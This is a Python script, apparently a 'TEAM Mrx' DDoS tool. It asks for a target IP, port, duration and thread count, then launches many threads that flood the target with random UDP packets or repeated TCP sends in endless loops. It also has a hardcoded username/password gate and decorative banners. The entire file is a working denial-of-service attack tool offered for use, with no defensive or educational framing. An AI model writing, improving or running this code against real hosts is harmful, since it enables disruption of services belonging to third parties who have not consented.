import random
import socket
import threading
import platform
import codecs
import struct
import time
import socket
import sys
import os

###### TEAM Mrx!!! #####
os.system("clear")
os.system("None")
print("\033[32m DDoS Team丶Mrx丶Is Loding ")
time.sleep(2)
print("Loading...")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('\033[34m Your Username : ')
    password = input('\033[34m Your Password : ')
    if username == 'MRX' and password == 'MRX':
        print('Mrhba Bik M3ana Fi Team!!')
        break
    else:
        print('\033[31m username w password Mshi Homa')
        attemps += 1
        continue
os.system("clear")

print("DDoS Is Loding : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM Mrx is Loding... :

╱╱▏┈┈╱╱╱╱▏╱╱▏
▇╱▏┈┈▇▇▇╱▏▇╱▏
▇╱▏▁┈▇╱▇╱▏▇╱▏▁
▇╱╱╱▏▇╱▇╱▏▇╱╱╱
▇▇▇╱┈▇▇▇╱┈▇▇▇╱  """)
else :
	print("""
	'\033[31m'
 TEAM Mrx Is Loding... :

    ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄  ⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
             
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁  
	
	Devloper : SAMORAY
    Owner : 9OCHI7A
			""")


print('DDos On')
ip= str(input("                    Ip Mrx :"))
port= int(input("                    port Mrx :"))
choice = str(input("                   Your Attack? (y/n) Mrx :"))
times= int(input("                   Time Mrx :"))
threads= int(input("                    threads Mrx :"))
fake_ip = '154.121.76.200'
#Starting Attacking
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM '\033[31m Mrx' TA9TA7EM!!!!")
		except:
			print("[!] TEAM Mrx TA9TA7EM!!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM '\033[32m Mrx' TA9TA7EM!!!!")
		except:
			s.close()
			print("[*] TEAM Mrx TA9TA7EM!!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()